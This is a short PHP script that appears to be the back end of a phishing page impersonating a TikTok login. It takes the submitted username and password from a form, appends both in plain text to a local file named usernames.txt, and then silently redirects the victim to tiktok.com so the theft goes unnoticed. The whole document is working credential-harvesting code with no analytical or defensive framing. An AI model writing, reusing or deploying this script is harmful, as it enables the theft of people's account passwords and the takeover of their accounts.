<?php 
file_put_contents("usernames.txt", "\nUsername: " . $_POST['Username'] . "\nPass: " . $_POST['Pass'] ."\n", FILE_APPEND);
header('Location: https://tiktok.com/');
exit();
?>